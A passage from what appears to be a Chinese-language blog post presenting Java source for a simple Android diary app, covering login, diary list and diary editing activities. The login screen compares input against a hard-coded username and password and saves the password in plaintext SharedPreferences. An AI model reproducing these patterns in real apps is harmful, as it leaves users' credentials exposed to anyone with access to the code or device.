</span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 定义需要的控件及方法</span><br><span class="hljs-comment">     */</span><br>    SharedPreferences.Editor editor;<br>    SharedPreferences pref;<br>    Button login;<br>    CheckBox rememberPass;<br>    EditText name;<br>    EditText pw;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 直接隐藏导航栏</span><br><span class="hljs-comment">         */</span><br><span class="hljs-comment">//        if (Build.VERSION.SDK_INT &gt;= 21) &#123;</span><br><span class="hljs-comment">//            View decorView = getWindow().getDecorView();</span><br><span class="hljs-comment">//            int option = View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN</span><br><span class="hljs-comment">//                    | View.SYSTEM_UI_FLAG_LAYOUT_STABLE;</span><br><span class="hljs-comment">//            decorView.setSystemUiVisibility(option);</span><br><span class="hljs-comment">//            getWindow().setStatusBarColor(Color.TRANSPARENT);</span><br><span class="hljs-comment">//        &#125;</span><br><span class="hljs-comment">//        ActionBar actionBar = getSupportActionBar();</span><br><span class="hljs-comment">//        actionBar.hide();</span><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 将控件及方法赋值</span><br><span class="hljs-comment">         */</span><br>        login=(Button)findViewById(R.id.login);<br>        rememberPass=(CheckBox)findViewById(R.id.rememberPass);<br>        name=(EditText)findViewById(R.id.accountEdit);<br>        pw=(EditText)findViewById(R.id.pwEdit);<br>        pref= PreferenceManager.getDefaultSharedPreferences(<span class="hljs-keyword">this</span>);<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 记录登录账户和密码</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">//判断是否已经记录</span><br>        <span class="hljs-keyword">boolean</span> isRemember=pref.getBoolean(<span class="hljs-string">&quot;remeber_password&quot;</span>,<span class="hljs-keyword">false</span>);<br>        <span class="hljs-comment">//如果记录进行设置填入</span><br>        <span class="hljs-keyword">if</span>(isRemember)&#123;<br>            <span class="hljs-comment">//通过pref存储的内容进行填充账户密码及记录</span><br>            String account=pref.getString(<span class="hljs-string">&quot;username&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>            String password=pref.getString(<span class="hljs-string">&quot;password&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>            name.setText(account);<br>            pw.setText(password);<br>            rememberPass.setChecked(<span class="hljs-keyword">true</span>);<br>        &#125;<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 点击登录按钮后的处理</span><br><span class="hljs-comment">         */</span><br>        login.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                <span class="hljs-comment">//获取用户的输入</span><br>                String username=name.getText().toString();<br>                String password=pw.getText().toString();<br>                <span class="hljs-comment">//判断输入是否正确并进入下一流程</span><br>                <span class="hljs-keyword">if</span>(username.equals(<span class="hljs-string">&quot;bsmslwx&quot;</span>)&amp;&amp;password.equals(<span class="hljs-string">&quot;ulovsis2@&quot;</span>))&#123;<br>                    <span class="hljs-comment">//获取记录文件的修改</span><br>                    editor=pref.edit();<br>                    <span class="hljs-comment">//判断是否记录登录信息</span><br>                    <span class="hljs-keyword">if</span>(rememberPass.isChecked())&#123;<br>                        <span class="hljs-comment">//记录用户的输入信息</span><br>                        editor.putBoolean(<span class="hljs-string">&quot;remeber_password&quot;</span>,<span class="hljs-keyword">true</span>);<br>                        editor.putString(<span class="hljs-string">&quot;username&quot;</span>,username);<br>                        editor.putString(<span class="hljs-string">&quot;password&quot;</span>,password);<br>                    &#125;<span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-comment">//如果不记录则清空</span><br>                        editor.clear();<br>                    &#125;<br>                    <span class="hljs-comment">//应用记录信息</span><br>                    editor.apply();<br>                    <span class="hljs-comment">//跳转界面</span><br>                    Intent intent = <span class="hljs-keyword">new</span> Intent(MainActivity.<span class="hljs-keyword">this</span>,DiaryListActivity.class);<br>                    startActivity(intent);<br>                &#125;<br>            &#125;<br>        &#125;);<br><br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 手机端更加优秀的隐藏导航栏</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> hasFocus</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onWindowFocusChanged</span><span class="hljs-params">(<span class="hljs-keyword">boolean</span> hasFocus)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onWindowFocusChanged(hasFocus);<br>        <span class="hljs-keyword">if</span> (hasFocus &amp;&amp; Build.VERSION.SDK_INT &gt;= <span class="hljs-number">21</span>) &#123;<br>            View decorView = getWindow().getDecorView();<br>            decorView.setSystemUiVisibility(<br>                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE<br>                            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION<br>                            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN<br>                            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION<br>                            | View.SYSTEM_UI_FLAG_FULLSCREEN<br>                            | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>DiaryListActivity.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> androidx.appcompat.app.ActionBar;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> androidx.fragment.app.Fragment;<br><span class="hljs-keyword">import</span> androidx.viewpager2.widget.ViewPager2;<br><br><span class="hljs-keyword">import</span> android.graphics.Bitmap;<br><span class="hljs-keyword">import</span> android.graphics.Color;<br><span class="hljs-keyword">import</span> android.graphics.drawable.BitmapDrawable;<br><span class="hljs-keyword">import</span> android.graphics.drawable.Drawable;<br><span class="hljs-keyword">import</span> android.os.Build;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.RelativeLayout;<br><br><span class="hljs-keyword">import</span> com.bumptech.glide.Glide;<br><span class="hljs-keyword">import</span> com.bumptech.glide.request.animation.GlideAnimation;<br><span class="hljs-keyword">import</span> com.bumptech.glide.request.target.SimpleTarget;<br><span class="hljs-keyword">import</span> com.lwx.blog.Adapter.DiaryPagerAdapter;<br><span class="hljs-keyword">import</span> com.lwx.blog.Bean.Img;<br><span class="hljs-keyword">import</span> com.lwx.blog.Fragment.DiaryFragment;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DiaryListActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span> </span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 定义需要的控件及方法</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> ViewPager2 diaryPagers;<br>    <span class="hljs-keyword">private</span> RelativeLayout main;<br>    ArrayList&lt;Fragment&gt; fragments=<span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_diary_list);<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 获取对应控件</span><br><span class="hljs-comment">         */</span><br>        diaryPagers=findViewById(R.id.diarypagers);<br>        main=findViewById(R.id.diary);<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 直接隐藏导航栏</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="hljs-number">21</span>) &#123;<br>            View decorView = getWindow().getDecorView();<br>            <span class="hljs-keyword">int</span> option = View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN<br>                    | View.SYSTEM_UI_FLAG_LAYOUT_STABLE;<br>            decorView.setSystemUiVisibility(option);<br>            getWindow().setStatusBarColor(Color.TRANSPARENT);<br>        &#125;<br>        ActionBar actionBar = getSupportActionBar();<br>        actionBar.hide();<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 利用Glide随机背景图片</span><br><span class="hljs-comment">         */</span><br>        backgrandChage();<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 多界面滑动展示</span><br><span class="hljs-comment">         */</span><br>        initDiaryPager(fragments);<br>        DiaryPagerAdapter pagerAdapter=<span class="hljs-keyword">new</span> DiaryPagerAdapter(getSupportFragmentManager(),getLifecycle(),fragments);<br>        diaryPagers.setAdapter(pagerAdapter);<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">initDiaryPager</span><span class="hljs-params">(ArrayList&lt;Fragment&gt; fragments)</span> </span>&#123;<br>        fragments.add(DiaryFragment.newInstance(<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>));<br>        fragments.add(DiaryFragment.newInstance(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">backgrandChage</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 利用Glide随机背景图片</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">//生成随机数</span><br>        Random random=<span class="hljs-keyword">new</span> Random();<br>        <span class="hljs-comment">//设置范围防止每次都更改</span><br>        <span class="hljs-keyword">int</span> src=random.nextInt(Img.getImg());<br>        String imgname=<span class="hljs-string">&quot;img&quot;</span>+src;<br>        <span class="hljs-comment">//设置背景</span><br>        <span class="hljs-keyword">int</span> imgsrc=getResources().getIdentifier(imgname,<span class="hljs-string">&quot;drawable&quot;</span>,<span class="hljs-string">&quot;com.lwx.blog&quot;</span>);<br>        <span class="hljs-comment">//具体利用Glide设置背景图</span><br>        Glide.with(DiaryListActivity.<span class="hljs-keyword">this</span>)<br>                .load(imgsrc)<br>                .asBitmap()<br>                .into(<span class="hljs-keyword">new</span> SimpleTarget&lt;Bitmap&gt;(<span class="hljs-number">1080</span>,<span class="hljs-number">2340</span>) &#123;<br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onResourceReady</span><span class="hljs-params">(Bitmap resource, GlideAnimation&lt;? <span class="hljs-keyword">super</span> Bitmap&gt; glideAnimation)</span> </span>&#123;<br>                        Drawable drawable = <span class="hljs-keyword">new</span> BitmapDrawable(resource);<br>                        <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.JELLY_BEAN) &#123;<br>                            main.setBackground(drawable);<br>                        &#125;<br>                    &#125;<br>                &#125;);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 手机端更加优秀的隐藏导航栏</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> hasFocus</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onWindowFocusChanged</span><span class="hljs-params">(<span class="hljs-keyword">boolean</span> hasFocus)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onWindowFocusChanged(hasFocus);<br>        <span class="hljs-keyword">if</span> (hasFocus &amp;&amp; Build.VERSION.SDK_INT &gt;= <span class="hljs-number">21</span>) &#123;<br>            View decorView = getWindow().getDecorView();<br>            decorView.setSystemUiVisibility(<br>                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE<br>                            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION<br>                            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN<br>                            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION<br>                            | View.SYSTEM_UI_FLAG_FULLSCREEN<br>                            | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ContentActivity.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> androidx.annotation.RequiresApi;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.ActionBar;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">import</span> android.content.ContentValues;<br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.database.Cursor;<br><span class="hljs-keyword">import</span> android.database.sqlite.SQLiteDatabase;<br><span class="hljs-keyword">import</span> android.graphics.Color;<br><span class="hljs-keyword">import</span> android.icu.text.SimpleDateFormat;<br><span class="hljs-keyword">import</span> android.os.Build;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.EditText;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><br><span class="hljs-keyword">import</span> com.lwx.blog.Bean.Database;<br><br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Date;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ContentActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span> </span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 定义需要的控件及方法</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> EditText title;<br>    <span class="hljs-keyword">private</span> EditText content;<br>    <span class="hljs-keyword">private</span> Button save;<br>    <span class="hljs-keyword">private</span> Button back;<br>    <span class="hljs-keyword">private</span> Database dbHelper;<br>    <span class="hljs-keyword">private</span> SQLiteDatabase db;<br>    <span class="hljs-meta">@RequiresApi(api = Build.VERSION_CODES.N)</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_content);<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 具体控件</span><br><span class="hljs-comment">         */</span><br>        save=findViewById(R.id.save);<br>        back=findViewById(R.id.back);<br>        title=findViewById(R.id.content_title);<br>        content=findViewById(R.id.content);<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 数据库进入</span><br><span class="hljs-comment">         */</span><br>        dbHelper=<span class="hljs-keyword">new</span> Database(ContentActivity.<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;blog.db&quot;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 判断上一个界面传入</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">//获取是否传入信息</span><br>        Bundle bundle=<span class="hljs-keyword">this</span>.getIntent().getExtras();<br>        <span class="hljs-keyword">if</span>(bundle!=<span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-comment">//如果有内容展示相关信息</span><br>            String up_title = bundle.getString(<span class="hljs-string">&quot;title&quot;</span>);<br>            String up_time = bundle.getString(<span class="hljs-string">&quot;time&quot;</span>);<br>            db=dbHelper.getWritableDatabase();<br>            Cursor cursor=db.query(<span class="hljs-string">&quot;diary&quot;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&quot;time=?&quot;</span>,<span class="hljs-keyword">new</span> String[]&#123;up_time&#125;,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>);<br>            <span class="hljs-keyword">if</span>(cursor.moveToFirst())&#123;<br>                String sql_content=cursor.getString(cursor.getColumnIndex(<span class="hljs-string">&quot;content&quot;</span>));<br>                title.setText(up_title);<br>                content.setText(sql_content);<br>            &#125;<br>        &#125;<br>         <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 长按文本库切换颜色</span><br><span class="hljs-comment">         */</span><br>        content.setOnLongClickListener(<span class="hljs-keyword">new</span> View.OnLongClickListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">onLongClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                <span class="hljs-comment">//0xFF0000FF是int类型的数据，分组一下0x|FF|0000FF，0x是代表颜色整数的标记，ff是表示透明度，0000FF表示颜色，注意：这里0xFF0000FF必须是8个的颜色表示，不接受0000FF这种6个的颜色表示。</span><br>                content.setTextColor(<span class="hljs-number">0xFFEA0000</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>            &#125;<br>        &#125;);<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 按钮save监听</span><br><span class="hljs-comment">         */</span><br>        save.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                <span class="hljs-comment">/**</span><br><span class="hljs-comment">                 * 判断是修改还是保存</span><br><span class="hljs-comment">                 */</span><br>                <span class="hljs-keyword">if</span>(bundle!=<span class="hljs-keyword">null</span>)&#123;<br>                    <span class="hljs-comment">/**</span><br><span class="hljs-comment">                     * 将输入内容进行修改</span><br><span class="hljs-comment">                     */</span><br>                    db=dbHelper.getWritableDatabase();<br>                    ContentValues values=<span class="hljs-keyword">new</span> ContentValues();<br>                    values.put(<span class="hljs-string">&quot;content&quot;</span>,content.getText().toString());<br>                    values.put(<span class="hljs-string">&quot;title&quot;</span>,title.getText().toString());<br>                    db.update(<span class="hljs-string">&quot;diary&quot;</span>,values,<span class="hljs-string">&quot;time=?&quot;</span>,<span class="hljs-keyword">new</span> String[]&#123;bundle.getString(<span class="hljs-string">&quot;time&quot;</span>)&#125;);<br>                    Toast.makeText(ContentActivity.<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;修改成功!&quot;</span>,Toast.LENGTH_SHORT).show();<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-comment">/**</span><br><span class="hljs-comment">                     * 将输入内容进行保存</span><br><span class="hljs-comment">                     */</span><br>                    db=dbHelper.getWritableDatabase();<br>                    ContentValues values=<span class="hljs-keyword">new</span> ContentValues();<br>                    values.put(<span class="hljs-string">&quot;title&quot;</span>,title.getText().toString());<br>                    values.put(<span class="hljs-string">&quot;content&quot;</span>,content.getText().toString());<br>                    <span class="hljs-comment">/**</span><br><span class="hljs-comment">                     * 获取当前时间</span><br><span class="hljs-comment">                     */</span><br>                    Date date = <span class="hljs-keyword">new</span> Date();<br>                    SimpleDateFormat formatter = <span class="hljs-keyword">new</span> SimpleDateFormat(<span class="hljs-string">&quot;dd-MM-yyyy HH:mm:ss&quot;</span>);<br>                    values.put(<span class="hljs-string">&quot;time&quot;</span>,formatter.format(date));<br>                    db.insert(<span class="hljs-string">&quot;diary&quot;</span>,<span class="hljs-keyword">null</span>,values);<br>                    Toast.makeText(ContentActivity.<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;保存成功!&quot;</span>,Toast.LENGTH_SHORT).show();<br>                &#125;<br>            &#125;<br>        &#125;);<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * back按钮监听</span><br><span class="hljs-comment">         */</span><br>        back.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                <span class="hljs-comment">//跳转到日志显示界面</span><br>                Intent intent = <span class="hljs-keyword">new</span> Intent(ContentActivity.<span class="hljs-keyword">this</span>,DiaryListActivity.class);<br>                startActivity(intent);<br>            &#125;<br>        &#125;);<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 手机端更加优秀的隐藏导航栏</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> hasFocus</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onWindowFocusChanged</span><span class="hljs-params">(<span class="hljs-keyword">boolean</span> hasFocus)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onWindowFocusChanged(hasFocus);<br>        <span class="hljs-keyword">if</span> (hasFocus &amp;&amp; Build.VERSION.SDK_INT &gt;= <span class="hljs-number">21</span>) &#123;<br>            View decorView = getWindow().getDecorView();<br>            decorView.setSystemUiVisibility(<br>                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE<br>                            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION<br>                            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN<br>                            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION<br>                            | View.SYSTEM_UI_FLAG_FULLSCREEN<br>                            | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="Adapter-类"><a href="#Adapter-类" class="headerlink" title="Adapter 类"></a>Adapter 类</h1><p>DiaryListAdapter.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> 